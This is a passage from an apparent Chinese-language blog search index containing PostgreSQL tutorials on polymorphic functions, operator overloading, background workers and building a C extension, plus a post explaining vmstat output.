anyelement)RETURNS BOOLEANAS $$ SELECT $1 &gt; $2;$$ LANGUAGE SQL;SELECT is_greater(7.0, 4.5); is_greater ------------ t(1 row)SELECT is_greater(2, 4); is_greater ------------ f(1 row) 输入输出参数均为多态类型。 12345678910CREATE OR REPLACE FUNCTION get_array(IN anyelement, IN anyelement, OUT anyelement, OUT anyarray)AS $$ SELECT $1, ARRAY[$1, $2];$$ LANGUAGE SQL;SELECT get_array(4,5), get_array('c'::text, 'd'::text); get_array | get_array -------------+------------- (4,\"&#123;4,5&#125;\") | (c,\"&#123;c,d&#125;\")(1 row) 函数重载在Postgresql中,多个函数可共用一个函数名，但它们的参数必须得不同。与面向对象的函数重载类似。 因此在Posgresql删除函数时，必须显示指定参数列表。 1DROP FUNCTION get_array(anyelement, anyelement); Postgresql扩展Sql-源码添加系统函数 PostgreSql扩展Sql-动态加载共享库(C函数) Postgresql扩展Sql-添加插件 参考 Postgresql 9.5 用户定义函数 Postgresql 系统函数分析记录","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"PostgresSql操作符重载","slug":"database/Postgresql操作符重载","date":"2018-09-13T15:27:54.000Z","updated":"2019-09-18T12:19:58.701Z","comments":true,"path":"2018/09/13/database/Postgresql操作符重载/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/09/13/database/Postgresql操作符重载/","excerpt":"运算符是一个保留字或字符主要用于PostgreSQL的语句的WHERE子句中执行操作，如比较和算术运算。 运算符用于指定一个PostgreSQL表中的条件，并在一份声明中多个条件作为连词。 算术运算符 比较操作符 逻辑运算符 位运算符","text":"运算符是一个保留字或字符主要用于PostgreSQL的语句的WHERE子句中执行操作，如比较和算术运算。 运算符用于指定一个PostgreSQL表中的条件，并在一份声明中多个条件作为连词。 算术运算符 比较操作符 逻辑运算符 位运算符 操作命令创建操作符12345678910Command: CREATE OPERATORDescription: define a new operatorSyntax:CREATE OPERATOR name ( PROCEDURE = function_name [, LEFTARG = left_type ] [, RIGHTARG = right_type ] [, COMMUTATOR = com_op ] [, NEGATOR = neg_op ] [, RESTRICT = res_proc ] [, JOIN = join_proc ] [, HASHES ] [, MERGES ]) 删除操作符1234Command: DROP OPERATORDescription: remove an operatorSyntax:DROP OPERATOR [ IF EXISTS ] name ( &#123; left_type | NONE &#125; , &#123; right_type | NONE &#125; ) [, ...] [ CASCADE | RESTRICT ] 查看系统操作符视图 pg_operator1select * from pg_operator; 思考如何重载操作符?操作符可以被重载，也就是说相同的操作符名称可以用于具有不同操作数数量和类型的操作符。在创建相应处理操作符之前必须先创建底层函数。 其执行的操作: create function create operation 方法一: internal 扩展 (需要重新initdb)实际，重新再pg_operator.h重载操作符 类似于 create function .... LANUAGE internal 方式。 需要将执行函数静态编译到Postgres 需要修改 pg_proc.h , 然后在 pg_operator.h 进行引用 不然将会报错。 提示 FATAL: 42883: there is no built-in function named &quot;xxxxxx&quot; pg_opertor.h pg_proc.h 执行函数 此处执行函数可以 sql 语句编写，也可以在 xxx.c 文件实现 过程如下: 在Pg源码添加系统函数-包括在pg_proc.h添加内建函数已关联c源码函数 pg_operator.h 编写指定操作符。 1DATA(insert OID = 3296 ( \"=\" PGNSP PGUID b t f 25 1700 16 3294 0 varchar_eq_numeric - - )); 方法二: c 扩展(不需要重新initdb)实际执行方式为create function ..... LANUAGE C , 在xxx.so共享库中查找执行函数。 插件编写并进行加载-实现psql内建函数与c源码函数关联 pg中关联操作符与指定psql函数 1234567CREATE OPERATOR name ( PROCEDURE = function_name [, LEFTARG = left_type ] [, RIGHTARG = right_type ] [, COMMUTATOR = com_op ] [, NEGATOR = neg_op ] [, RESTRICT = res_proc ] [, JOIN = join_proc ] [, HASHES ] [, MERGES ]) name PROCEDURE 用来实现这个操作符的psql函数 LEFTARG 这个操作符的左操作数（如果有）的数据类型。忽略这个选项 可以表示一个左一元操作符。 RIGHTARG 这个操作符的右操作数（如果有）的数据类型。忽略这个选项 可以表示一个右一元操作符。 COMMUTATOR 这个操作符的交换子。 意味着左右操作数类型与此类型相反,指定其操作符。 NEGATOR 这个操作符的求反器。 例如: = 操作符的 求反器为 != RESTRICT 用于这个操作符的限制选择度估计函数。 JOIN 用于这个操作符的连接选择度估算函数。 HASHES 表示这个操作符可以支持哈希连接。 MERGES 表示这个操作符可以支持归并连接。 图示 1234CREATE OPERATOR pg_catalog.= ( leftarg = numeric, rightarg = text, procedure = numeric_eq_varchar, commutator = OPERATOR(=) -- 添加左右参数交换操作函数); 此示例为添加其左右交换因子; 示例: 123456789CREATE FUNCTION complex_abs_lt(complex, complex) RETURNS bool AS &apos;filename&apos;, &apos;complex_abs_lt&apos; LANGUAGE C IMMUTABLE STRICT;CREATE OPERATOR &lt; ( leftarg = complex, rightarg = complex, procedure = complex_abs_lt, commutator = &gt; , negator = &gt;= , restrict = scalarltsel, join = scalarltjoinsel); 源代码定义解析12345678910111213141516171819\"cat src/include/catalog/pg_operator.h\"CATALOG(pg_operator,2617)&#123; NameData oprname; /* name of operator */ Oid oprnamespace; /* OID of namespace containing this oper */ Oid oprowner; /* operator owner */ char oprkind; /* 'l', 'r', or 'b' */ bool oprcanmerge; /* can be used in merge join? */ bool oprcanhash; /* can be used in hash join? */ Oid oprleft; /* left arg type, or 0 if 'l' oprkind */ Oid oprright; /* right arg type, or 0 if 'r' oprkind */ Oid oprresult; /* result datatype */ Oid oprcom; /* OID of commutator oper, or 0 if none */ Oid oprnegate; /* OID of negator oper, or 0 if none */ regproc oprcode; /* OID of underlying function */ regproc oprrest; /* OID of restriction estimator, or 0 */ regproc oprjoin; /* OID of join estimator, or 0 */&#125; FormData_pg_operator; 参考 Postgresql 9.5 Create Operator参考","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"性能监控 vmstat","slug":"commands/linux-性能监控vmstat","date":"2018-09-12T13:09:04.000Z","updated":"2018-12-05T11:06:25.623Z","comments":true,"path":"2018/09/12/commands/linux-性能监控vmstat/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/09/12/commands/linux-性能监控vmstat/","excerpt":"vmstat命令是最常见的Linux/Unix监控工具，可以展现给定时间间隔的服务器的状态值,包括服务器的CPU使用率，内存使用，虚拟内存交换情况,IO读写情况。这个命令是我查看Linux/Unix最喜爱的命令，一个是Linux/Unix都支持，二是相比top，我可以看到整个机器的CPU,内存,IO的使用情况，而不是单单看到各个进程的CPU使用率和内存使用率(使用场景不一样)。 一般vmstat工具的使用是通过两个数字参数来完成的: 第一个参数是采样的时间间隔数，单位是秒. 第二个参数是采样的次数. 1234567procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 149772 0 3485736 0 0 0 0 22 34 0 0 100 0 0 0 0 0 149772 0 3485736 0 0 0 0 10 16 0 0 100 0 0 0 0 0 149772 0 3485736 0 0 0 0 13 25 0 0 100 0 0 0 0 0 149684 0 3485756 0 0 0 0 65 98 1 1 99 0 0 0 0 0 149772 0 3485756 0 0 0 0 11 18 0 0 100 0 0","text":"vmstat命令是最常见的Linux/Unix监控工具，可以展现给定时间间隔的服务器的状态值,包括服务器的CPU使用率，内存使用，虚拟内存交换情况,IO读写情况。这个命令是我查看Linux/Unix最喜爱的命令，一个是Linux/Unix都支持，二是相比top，我可以看到整个机器的CPU,内存,IO的使用情况，而不是单单看到各个进程的CPU使用率和内存使用率(使用场景不一样)。 一般vmstat工具的使用是通过两个数字参数来完成的: 第一个参数是采样的时间间隔数，单位是秒. 第二个参数是采样的次数. 1234567procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 149772 0 3485736 0 0 0 0 22 34 0 0 100 0 0 0 0 0 149772 0 3485736 0 0 0 0 10 16 0 0 100 0 0 0 0 0 149772 0 3485736 0 0 0 0 13 25 0 0 100 0 0 0 0 0 149684 0 3485756 0 0 0 0 65 98 1 1 99 0 0 0 0 0 149772 0 3485756 0 0 0 0 11 18 0 0 100 0 0 解析 Procs（进程） r: 运行队列中进程数量，这个值也可以判断是否需要增加CPU。（长期大于1） b: 等待IO的进程数量。 Memory（内存） swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。 free: 空闲物理内存大小。 buff: 用作缓冲的内存大小。 cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多，如果频繁访问到的文件都能被cache处，那么磁盘的读IO bi会非常小。 Swap si: 每秒从交换区写到内存的大小，由磁盘调入内存。 so: 每秒写入交换区的内存大小，由内存调入磁盘。 注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。 IO（现在的Linux版本块的大小为1kb） bi: 每秒读取的块数 bo: 每秒写入的块数 注意：随机磁盘读写的时候，这2个值越大（如超出1024k)，能看到CPU在IO等待的值也会越大。 system（系统） in: 每秒中断数，包括时钟中断。 cs: 每秒上下文切换数。 注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。 CPU（以百分比表示） us: 用户进程执行时间百分比(user time) us的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。 sy: 内核系统进程执行时间百分比(system time) sy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。 wa: IO等待时间百分比 wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。 id: 空闲时间百分比","categories":[{"name":"命令,性能监控","slug":"命令-性能监控","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令-性能监控/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"},{"name":"性能监控","slug":"性能监控","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/性能监控/"}]},{"title":"Postgresql-后台进程","slug":"database/Postgresql-后台进程","date":"2018-09-01T02:07:57.000Z","updated":"2019-09-18T12:19:17.419Z","comments":true,"path":"2018/09/01/database/Postgresql-后台进程/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/09/01/database/Postgresql-后台进程/","excerpt":"通俗来讲，就是运行在后台的一个或多个工作线程。 可以以扩展的方式存在。该进程的启动/停止/监控都是通过postgres来管理的。 12345678910111213# source:src/include/postmaster/bgworker.htypedef struct BackgroundWorker&#123; char bgw_name[BGW_MAXLEN]; //后台bgw的名称 int bgw_flags; BgWorkerStartTime bgw_start_time; int bgw_restart_time; /* in seconds, or BGW_NEVER_RESTART */ char bgw_library_name[BGW_MAXLEN]; # 动态库的名称 char bgw_function_name[BGW_MAXLEN]; # bgw的进程主函数 Datum bgw_main_arg; # 进程主函数的入参 char bgw_extra[BGW_EXTRALEN]; # MyBgworkerEntry的参数。 pid_t bgw_notify_pid; /* SIGUSR1 this backend on start/stop */&#125; BackgroundWorker;","text":"通俗来讲，就是运行在后台的一个或多个工作线程。 可以以扩展的方式存在。该进程的启动/停止/监控都是通过postgres来管理的。 12345678910111213# source:src/include/postmaster/bgworker.htypedef struct BackgroundWorker&#123; char bgw_name[BGW_MAXLEN]; //后台bgw的名称 int bgw_flags; BgWorkerStartTime bgw_start_time; int bgw_restart_time; /* in seconds, or BGW_NEVER_RESTART */ char bgw_library_name[BGW_MAXLEN]; # 动态库的名称 char bgw_function_name[BGW_MAXLEN]; # bgw的进程主函数 Datum bgw_main_arg; # 进程主函数的入参 char bgw_extra[BGW_EXTRALEN]; # MyBgworkerEntry的参数。 pid_t bgw_notify_pid; /* SIGUSR1 this backend on start/stop */&#125; BackgroundWorker; bgw_flags取值: 1234567891011121314151617181920/* * Pass this flag to have your worker be able to connect to shared memory. */#define BGWORKER_SHMEM_ACCESS 0x0001 # 是否允许访问共享内存 /* * This flag means the bgworker requires a database connection. The connection * is not established automatically; the worker must establish it later. * It requires that BGWORKER_SHMEM_ACCESS was passed too. */#define BGWORKER_BACKEND_DATABASE_CONNECTION 0x0002 # 是否允许连接数据库/* * This class is used internally for parallel queries, to keep track of the * number of active parallel workers and make sure we never launch more than * max_parallel_workers parallel workers at the same time. Third party * background workers should not use this class. */#define BGWORKER_CLASS_PARALLEL 0x0010 # 是否允许并行执行query bgw_start_time启动模式取值: 123456typedef enum&#123; BgWorkerStart_PostmasterStart, # 紧随postmaster一起启动(不能连接数据库) BgWorkerStart_ConsistentState, # 只是在热备模式中是一致状态，就允许启动(只能是只读模式) BgWorkerStart_RecoveryFinished # 数据库进入一切正常模式，能正常的进行读写&#125; BgWorkerStartTime; 如何启动工作: static(RegisterBackgroundWorker) 首先判断Postmaster是否启动 判断动态库是否添加配置文件shard_preload_libraries以及动态库名字是否等于”postgres” SanityCheckBackgroundWorker(worker, LOG) 参数 检查 bgw_flags &amp; BGWORKER_BACKEND_DATABASE_CONNECTION workrt-&gt;bgw_restart_time bgw_notify_pid 是否 == 0 ++numworkers &gt; max_worker_processes 判断后台worker processes 是否大于最大max_worker_processes 插入slist_push_head(); 单链表; GDB调试postgres数据 123456789bgw_name = \"logical replication launcher\", '\\000' &lt;repeats 35 times&gt;, bgw_flags = 3, bgw_start_time = BgWorkerStart_RecoveryFinished, bgw_restart_time = 5, bgw_library_name = \"postgres\", '\\000' &lt;repeats 55 times&gt;, bgw_function_name = \"ApplyLauncherMain\", '\\000' &lt;repeats 46 times&gt;, bgw_main_arg = 0, bgw_extra = '\\000' &lt;repeats 127 times&gt;, bgw_notify_pid = 0 示例","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"Postgresql扩展Sql-添加插件","slug":"database/Postgresql扩展Sql-添加插件","date":"2018-08-30T11:46:55.000Z","updated":"2019-09-18T12:19:44.413Z","comments":true,"path":"2018/08/30/database/Postgresql扩展Sql-添加插件/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/08/30/database/Postgresql扩展Sql-添加插件/","excerpt":"我们都知道 PostgreSQL 提供了丰富数据库内核编程的接口，允许开发者以插件的形式把功能融入数据库内核。PostgreSQL 提供了一个插件管理模块，用于管理用户创建的插件。 {插件编写可以参照共享库编写;} PostgreSQL 支持使用PL/pgSQL语言或者原生的C语言开发扩展。PL/pgSQL开发简单，然而性能上较原生的C语言要逊色不少。有不少人已经做过相关的性能测试，这里就不再重复说明。我们开发的扩展的目的是为了增强生产的 PostgreSQL，自然要选择性能更好的C语言。","text":"我们都知道 PostgreSQL 提供了丰富数据库内核编程的接口，允许开发者以插件的形式把功能融入数据库内核。PostgreSQL 提供了一个插件管理模块，用于管理用户创建的插件。 {插件编写可以参照共享库编写;} PostgreSQL 支持使用PL/pgSQL语言或者原生的C语言开发扩展。PL/pgSQL开发简单，然而性能上较原生的C语言要逊色不少。有不少人已经做过相关的性能测试，这里就不再重复说明。我们开发的扩展的目的是为了增强生产的 PostgreSQL，自然要选择性能更好的C语言。 基本命令创建1234567create extension exten_name;CREATE EXTENSION [ IF NOT EXISTS ] extension_name [ WITH ] [ SCHEMA schema_name ] [ VERSION version ] [ FROM old_version ] [ CASCADE ] 删除123drop extension postgres_fdw cascade;DROP EXTENSION [ IF EXISTS ] name [, ...] [ CASCADE | RESTRICT ] 管理视图pg_extension123456shell=# select * from pg_extension; extname | extowner | extnamespace | extrelocatable | extversion | extconfig | extcondition ----------+----------+--------------+----------------+------------+-----------+-------------- plpgsql | 10 | 11 | f | 1.0 | | oraftops | 10 | 8001 | f | 1.0 | | (2 rows) 插件编写通常一个 PostgreSQL 内核插件包括下面的部分 包含功能的逻辑的动态库，即 so 文件。 描述插件信息的的控制文件，即 control 文件。 一组文件用于创建、更新和删除插件，这是一组按照版本命名的 SQL 文本文件。 新建插件为了进行create extension命令加载扩展,必须存在以下两个文件: extension_name.control 控制文件，声明该扩展的基础信息。 extension--version.sql 加载扩展所需要执行的SQL文件。 12344 -rw-rw-r--. 1 Pg Pg 475 Aug 7 14:56 file_fdw--1.0.sql4 -rw-rw-r--. 1 Pg Pg 155 Aug 7 14:56 file_fdw.control4 -rw-rw-r--. 1 Pg Pg 467 Aug 7 14:56 Makefile4 -rw-rw-r--. 1 Pg Pg 382 Aug 30 12:42 rock_hello.c 代码如下: rock_hello.control12345# rock_hello extensioncomment = &apos;foreign-data wrapper for flat file access&apos;default_version = &apos;1.0&apos;module_pathname = &apos;$libdir/rock_hello&apos;relocatable = true rock_hello--1.0.sql12345678910/* contrib/rock_hello/rock_hello--1.0.sql */-- complain if script is sourced in psql, rather than via CREATE EXTENSION\\echo Use \"create EXTENSION rock_hello\" to load this file. \\quitCREATE FUNCTION say_hello() RETURNS textAS 'MODULE_PATHNAME'--AS '$libdir/rock_hello'LANGUAGE C STRICT; rock_hello.c123456789101112131415#include \"postgres.h\"#include \"fmgr.h\"#ifdef PG_MODULE_MAGICPG_MODULE_MAGIC;#endifPG_FUNCTION_INFO_V1(say_hello);Datum say_hello(PG_FUNCTION_ARGS)&#123; char* arg = PG_GETARG_CSTRING(0); PG_RETURN_CSTRING(\"say_hello!\");&#125; 以上代码中.h 数据类型与函数 查看上一篇，Pg添加共享库。 Makefile1234567891011121314151617181920212223# contrib/rock_hello/MakefileMODULES = rock_hello## 扩展名称;EXTENSION = rock_hello## 扩展安装的SQL文件;DATA = rock_hello--1.0.sql## 扩展描述;PGFILEDESC = \"rock_hello - foreign data wrapper for files\"### 以下为Pg构建扩展相关命令;ifdef USE_PGXSPG_CONFIG = pg_configPGXS := $(shell $(PG_CONFIG) --pgxs)include $(PGXS) ## 环境变量参数加载;elsesubdir = contrib/rock_hellotop_builddir = ../..include $(top_builddir)/src/Makefile.globalinclude $(top_srcdir)/contrib/contrib-global.mkendif 编译并加载12345678910111213141516171819[Pg@yfslcentos71 rock_hello]$ make[Pg@yfslcentos71 rock_hello]$ sudo make install [Pg@yfslcentos71 rock_hello]$ psqlPg=# create extension rock_hello;CREATE EXTENSIONPg=# Pg=# Pg=# select * from pg_extension; extname | extowner | extnamespace | extrelocatable | extversion | extconfig | extcondition ------------+----------+--------------+----------------+------------+-----------+-------------- plpgsql | 10 | 11 | f | 1.0 | | oraftops | 10 | 8001 | f | 1.0 | | rock_hello | 10 | 2200 | t | 1.0 | | (3 rows)Pg=# select say_hello(); say_hello ----------- ay_hello!(1 row) 插件更新有时候，我们需要做插件的 BUGFIX ，或定制一些功能。这就用到了插件更新功能。 首先，我们需要升级插件的小版本 修改控制文件 .control, 增加一个小版本，如果当前版本是 1.0，则文件中版本号修改成 1.1 添加新版本的的 DDL SQL文件 ==&gt; 全部DDL.sql 添加新版本的DDL SQL 文件*–1.1.sql, 用于从零创建该插件。 该 SQL 文件应该包括该插件的所有对象的 DDL。 添加用户老版本升级到新版本的DDL SQL文件 ==&gt; 升级操作DDL.sql 创建 *1.0–-1.1.sql，用于从版本 1.0升级到 1.1 该 SQL 文件只包含 1.1版本中新创建的对象。用户的升级操作会调用该 SQL 文件，从而避免了完全重新创建。 修改源码添加新的功能，编译并安装到指定目录。 C源码编写 使用 SQL 升级小版本 1alter extension postgres_fdw update; 如果成功更新，我们能从视图中看到对应的小版本号被更新了。 12345postgres=# select * from pg_extension ; extname | extowner | extnamespace | extrelocatable | extversion | extconfig | extcondition --------------+----------+--------------+----------------+------------+-----------+--------------rock_hello | 10 | 2200 | t | 1.1 | | (2 rows) 使用 PostgreSQL 的插件管理功能，用户很容开发和维护需要的插件。 新增pg_say_name函数: rock_hello.control12345# rock_hello extensioncomment = &apos;foreign-data wrapper for flat file access&apos;default_version = &apos;1.1&apos; ## 更改版本号module_pathname = &apos;$libdir/rock_hello&apos;relocatable = true rock_hello--1.1.sql123456789101112131415161718/* contrib/rock_hello/rock_hello--1.1.sql */-- complain if script is sourced in psql, rather than via CREATE EXTENSION\\echo Use \"create EXTENSION rock_hello\" to load this file. \\quit--- 以前DDLCREATE FUNCTION say_hello() RETURNS textAS 'MODULE_PATHNAME'--AS '$libdir/rock_hello'LANGUAGE C STRICT;--- 新增处理函数;CREATE FUNCTION pg_say_name(text) RETURNS textAS 'MODULE_PATHNAME' --AS '$libdir/rock_hello'LANGUAGE C STRICT; rock_hello--1.0--1.1.sql 升级DDL12345678910/* contrib/rock_hello/rock_hello--1.0--1.1.sql */-- complain if script is sourced in psql, rather than via CREATE EXTENSION\\echo Use \"alter EXTENSION rock_hello update to 1.1\" to load this file. \\quit-- 新增Function;CREATE FUNCTION pg_say_name(text) RETURNS textAS 'MODULE_PATHNAME' --AS '$libdir/rock_hello'LANGUAGE C STRICT; Makefile1234567891011121314151617181920212223# contrib/rock_hello/MakefileMODULES = rock_hello## 扩展名称;EXTENSION = rock_hello## 扩展安装的SQL文件;DATA = rock_hello--1.1.sql rock_hello--1.0--1.1.sql## 扩展描述;PGFILEDESC = \"rock_hello - foreign data wrapper for files\"### 以下为Pg构建扩展相关命令;ifdef USE_PGXSPG_CONFIG = pg_configPGXS := $(shell $(PG_CONFIG) --pgxs)include $(PGXS)elsesubdir = contrib/rock_hellotop_builddir = ../..include $(top_builddir)/src/Makefile.globalinclude $(top_srcdir)/contrib/contrib-global.mkendif 编译并加载1234567891011121314151617181920[Pg@yfslcentos71 rock_hello]$ make[Pg@yfslcentos71 rock_hello]$ sudo make install [Pg@yfslcentos71 rock_hello]$ psqlPg=# alter extension rock_hello update;ALTER EXTENSIONPg=# Pg=# select * from pg_extension; extname | extowner | extnamespace | extrelocatable | extversion | extconfig | extcondition ------------+----------+--------------+----------------+------------+-----------+-------------- plpgsql | 10 | 11 | f | 1.0 | | oraftops | 10 | 8001 | f | 1.0 | | rock_hello | 10 | 2200 | t | 1.1 | | (3 rows)Pg=# Pg=# select pg_say_name(&apos;nihao&apos;); pg_say_name ------------- nihao(1 row) 编译过程分析1234567891011121314151617181920212223[Pg@yfslcentos71 rock_hello]$ makegcc -Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Wendif-labels -Wmissing-format-attribute -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -g -fPIC -I. -I. -I../../src/include -D_GNU_SOURCE -c -o rock_hello.o rock_hello.crock_hello.c: In function ‘say_hello’:rock_hello.c:15:11: warning: unused variable ‘arg’ [-Wunused-variable] char* arg = PG_GETARG_CSTRING(0); ^gcc -Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Wendif-labels -Wmissing-format-attribute -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -g -fPIC -L../../src/port -L../../src/common -Wl,--as-needed -Wl,-rpath,'/usr/local/postgresql/lib',--enable-new-dtags -shared -o rock_hello.so rock_hello.o[Pg@yfslcentos71 rock_hello]$ make install /usr/bin/mkdir -p '/usr/local/postgresql/share/extension'/usr/bin/mkdir -p '/usr/local/postgresql/share/extension'/usr/bin/mkdir -p '/usr/local/postgresql/lib'/usr/bin/install -c -m 644 ./rock_hello.control '/usr/local/postgresql/share/extension/'/usr/bin/install: cannot create regular file ‘/usr/local/postgresql/share/extension/rock_hello.control’: Permission deniedmake: *** [install] Error 1[Pg@yfslcentos71 rock_hello]$ [Pg@yfslcentos71 rock_hello]$ sudo make install [sudo] password for Pg: /usr/bin/mkdir -p '/usr/local/postgresql/share/extension'/usr/bin/mkdir -p '/usr/local/postgresql/share/extension'/usr/bin/mkdir -p '/usr/local/postgresql/lib'/usr/bin/install -c -m 644 ./rock_hello.control '/usr/local/postgresql/share/extension/'/usr/bin/install -c -m 644 ./rock_hello--1.0.sql '/usr/local/postgresql/share/extension/'/usr/bin/install -c -m 755 rock_hello.so '/usr/local/postgresql/lib/' 我们发现make过程中添加了 -fPIC -shared， 实际此处是编译成共享库的过程。 12345Pg=# select proname,prolang, prorettype,proargtypes, prosrc,probin from pg_proc where probin like '%rock_hello%'; proname | prolang | prorettype | proargtypes | prosrc | probin -------------+---------+------------+-------------+-------------+-------------------- say_hello | 13 | 25 | | say_hello | $libdir/rock_hello pg_say_name | 13 | 25 | 25 | pg_say_name | $libdir/rock_hello 测试 make installcheck (未完)Makefile 12345## list of regression test cases;REGRESS = rock_hello## extra files to remove in make clean EXTRA_CLEAN = sql/rock_hello.sql expected/rock_hello.out make installcheck 会调用psql执行每一个测试脚本，并将结果输出与相应的预期输出进行比较。 测试脚本必须在sql目录中出现。 expected目录放置一个包含预期输出的文件。 123456789101112131415161718192021222324252627[Pg@yfslcentos71 rock_hello]$ make installcheckmake -C ../../src/test/regress pg_regressmake[1]: Entering directory `/home/Pg/hgdb-core/src/test/regress&apos;make -C ../../../src/port allmake[2]: Entering directory `/home/Pg/hgdb-core/src/port&apos;make -C ../backend submake-errcodesmake[3]: Entering directory `/home/Pg/hgdb-core/src/backend&apos;make[3]: Nothing to be done for `submake-errcodes&apos;.make[3]: Leaving directory `/home/Pg/hgdb-core/src/backend&apos;make[2]: Leaving directory `/home/Pg/hgdb-core/src/port&apos;make -C ../../../src/common allmake[2]: Entering directory `/home/Pg/hgdb-core/src/common&apos;make -C ../backend submake-errcodesmake[3]: Entering directory `/home/Pg/hgdb-core/src/backend&apos;make[3]: Nothing to be done for `submake-errcodes&apos;.make[3]: Leaving directory `/home/Pg/hgdb-core/src/backend&apos;make[2]: Leaving directory `/home/Pg/hgdb-core/src/common&apos;make[1]: Leaving directory `/home/Pg/hgdb-core/src/test/regress&apos;../../src/test/regress/pg_regress --inputdir=. --bindir=&apos;/usr/local/postgresql/bin&apos; --dbname=contrib_regression rock_hello(using postmaster on Unix socket, default port)============== dropping database &quot;contrib_regression&quot; ==============NOTICE: database &quot;contrib_regression&quot; does not exist, skippingDROP DATABASE============== creating database &quot;contrib_regression&quot; ==============CREATE DATABASEALTER DATABASE============== dropping extension &quot;oraftops&quot; ============== 补充Makefile变量设置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455MODULES list of shared-library objects to be built from source files with same stem (do not include library suffixes in this list)MODULE_biga shared library to build from multiple source files (list object files in OBJS)PROGRAM an executable program to build (list object files in OBJS)The following variables can also be set:EXTENSION extension name(s); for each name you must provide an extension.control file, which will be installed into prefix/share/extensionMODULEDIR subdirectory of prefix/share into which DATA and DOCS files should be installed (if not set, default is extension if EXTENSION is set, or contrib if not)DATA random files to install into prefix/share/$MODULEDIRDATA_built random files to install into prefix/share/$MODULEDIR, which need to be built firstDATA_TSEARCH random files to install under prefix/share/tsearch_dataDOCS random files to install under prefix/doc/$MODULEDIRSCRIPTS script files (not binaries) to install into prefix/binSCRIPTS_built script files (not binaries) to install into prefix/bin, which need to be built firstREGRESS list of regression test cases (without suffix), see belowREGRESS_OPTS additional switches to pass to pg_regressEXTRA_CLEAN extra files to remove in make cleanPG_CPPFLAGS will be added to CPPFLAGSPG_LIBS will be added to PROGRAM link lineSHLIB_LINK will be added to MODULE_big link linePG_CONFIG path to pg_config program for the PostgreSQL installation to build against (typically just pg_config to use the first one in your PATH) 插件是通过动态库形式引入到内核中。和内核在同一个进程中运行，且没有内存保护，影响内核的稳定性。开发中需要特别注意内存的使用。不要造成内存泄露或越界写。建议使用 PostgreSQL 的内存管理机制，插件中也能使用。 内核中被标记成PGDLLIMPORT 的全局变量都能在插件中直接使用，这些通常是一些 GUC 参数。 内核中非 static 的函数也能在插件中使用，只需要先 extern 它们。 我们可以实现 _PG_init 用于实现一些初始化工作，该函数在连接建立后只会被执行一次。 我们可以在 _PG_init 中使用函数 DefineCustom*Variable 定义对应插件相关的 GUC 参数，他们可以用于开启和关闭该插件的一些功能。 插件的参数需要以插件名开头且加上点，例如 oss_fdw.enable_parallel_read。 rock_hello.tar.gz 下载 Pg 10中文手册","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"PostgreSql扩展Sql-动态加载共享库(C函数)","slug":"database/PostgreSql扩展Sql-动态加载共享库-C函数","date":"2018-08-23T11:13:40.000Z","updated":"2019-09-18T12:19:04.733Z","comments":true,"path":"2018/08/23/database/PostgreSql扩展Sql-动态加载共享库-C函数/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/08/23/database/PostgreSql扩展Sql-动态加载共享库-C函数/","excerpt":"系统函数编写 基于 psql (PostgreSQL) 10.4 